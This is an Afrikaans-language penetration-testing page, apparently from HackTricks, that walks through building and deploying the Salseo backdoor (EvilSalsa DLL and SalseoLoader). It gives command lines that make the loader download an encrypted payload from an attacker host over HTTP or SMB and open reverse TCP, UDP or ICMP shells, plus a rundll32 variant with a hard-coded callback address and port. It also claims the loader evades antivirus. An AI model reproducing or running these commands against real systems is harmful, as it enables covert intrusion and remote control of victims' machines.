# Salseo

{{#include ../banners/hacktricks-training.md}}

## Samevoeg van die binêre

Laai die bronkode van die github af en saam te stel **EvilSalsa** en **SalseoLoader**. Jy sal **Visual Studio** geïnstalleer moet hê om die kode saam te stel.

Stel daardie projekte saam vir die argitektuur van die Windows-boks waar jy dit gaan gebruik (As die Windows x64 ondersteun, stel dit saam vir daardie argitektuur).

Jy kan **die argitektuur kies** binne Visual Studio in die **linker "Build" Tab** in **"Platform Target".**

(\*\*As jy nie hierdie opsies kan vind nie, druk op **"Project Tab"** en dan op **"\<Project Name> Properties"**)

![](<../images/image (132).png>)

Dan, bou albei projekte (Build -> Build Solution) (Binne die logs sal die pad van die uitvoerbare verskyn):

![](<../images/image (1) (2) (1) (1) (1).png>)

## Berei die Backdoor voor

Eerstens, jy sal die **EvilSalsa.dll.** moet kodeer. Om dit te doen, kan jy die python-skrip **encrypterassembly.py** gebruik of jy kan die projek **EncrypterAssembly** saamstel:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, nou het jy alles wat jy nodig het om al die Salseo goed te voer: die **gecodeerde EvilDalsa.dll** en die **binarie van SalseoLoader.**

**Laai die SalseoLoader.exe binarie op die masjien. Hulle behoort nie deur enige AV opgespoor te word nie...**

## **Voer die backdoor uit**

### **Kry 'n TCP reverse shell (aflaai van die gecodeerde dll deur HTTP)**

Onthou om 'n nc te begin as die reverse shell luisteraar en 'n HTTP bediener om die gecodeerde evilsalsa te bedien.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Om 'n UDP omgekeerde skulp te kry (gedownloade kodering dll deur SMB)**

Onthou om 'n nc as die omgekeerde skulp luisteraar te begin, en 'n SMB-bediener om die gekodeerde evilsalsa (impacket-smbserver) te bedien.
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Kry 'n ICMP omgekeerde skulp (geënkodeerde dll reeds binne die slagoffer)**

**Hierdie keer het jy 'n spesiale hulpmiddel in die kliënt nodig om die omgekeerde skulp te ontvang. Laai af:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Deaktiveer ICMP Antwoorde:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Voer die kliënt uit:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Binne die slagoffer, kom ons voer die salseo ding uit:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Samevoeging van SalseoLoader as DLL wat hooffunksie uitvoer

Maak die SalseoLoader-projek oop met Visual Studio.

### Voeg voor die hooffunksie by: \[DllExport]

![](<../images/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Installeer DllExport vir hierdie projek

#### **Gereedskap** --> **NuGet Pakketbestuurder** --> **Bestuur NuGet-pakkette vir Oplossing...**

![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Soek vir DllExport-pakket (met die Blader-oortjie), en druk Installeer (en aanvaar die pop-up)**

![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

In jou projekmap het die lêers verskyn: **DllExport.bat** en **DllExport_Configure.bat**

### **U**ninstalleer DllExport

Druk **Uninstall** (ja, dit is vreemd, maar glo my, dit is nodig)

![](<../images/image (5) (1) (1) (2) (1).png>)

### **Verlaat Visual Studio en voer DllExport_configure uit**

Net **verlaat** Visual Studio

Gaan dan na jou **SalseoLoader-gids** en **voer DllExport_Configure.bat** uit

Kies **x64** (as jy dit binne 'n x64-boks gaan gebruik, dit was my geval), kies **System.Runtime.InteropServices** (binne **Namespace vir DllExport**) en druk **Toepas**

![](<../images/image (7) (1) (1) (1) (1).png>)

### **Maak die projek weer oop met Visual Studio**

**\[DllExport]** moet nie langer as 'n fout gemerk wees nie

![](<../images/image (8) (1).png>)

### Bou die oplossing

Kies **Uitsettipe = Klasbiblioteek** (Projek --> SalseoLoader Eienskappe --> Aansoek --> Uitsettipe = Klasbiblioteek)

![](<../images/image (10) (1).png>)

Kies **x64** **platform** (Projek --> SalseoLoader Eienskappe --> Bou --> Platform-teiken = x64)

![](<../images/image (9) (1) (1).png>)

Om die oplossing te **bou**: Bou --> Bou Oplossing (Binne die Uitset-konsol sal die pad van die nuwe DLL verskyn)

### Toets die gegenereerde Dll

Kopieer en plak die Dll waar jy dit wil toets.

Voer uit:
```
rundll32.exe SalseoLoader.dll,main
```
As daar geen fout verskyn nie, het jy waarskynlik 'n funksionele DLL!!

## Kry 'n shell met die DLL

Moet nie vergeet om 'n **HTTP** **bediener** te gebruik en 'n **nc** **luisteraar** in te stel nie

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{{#include ../banners/hacktricks-training.md}}
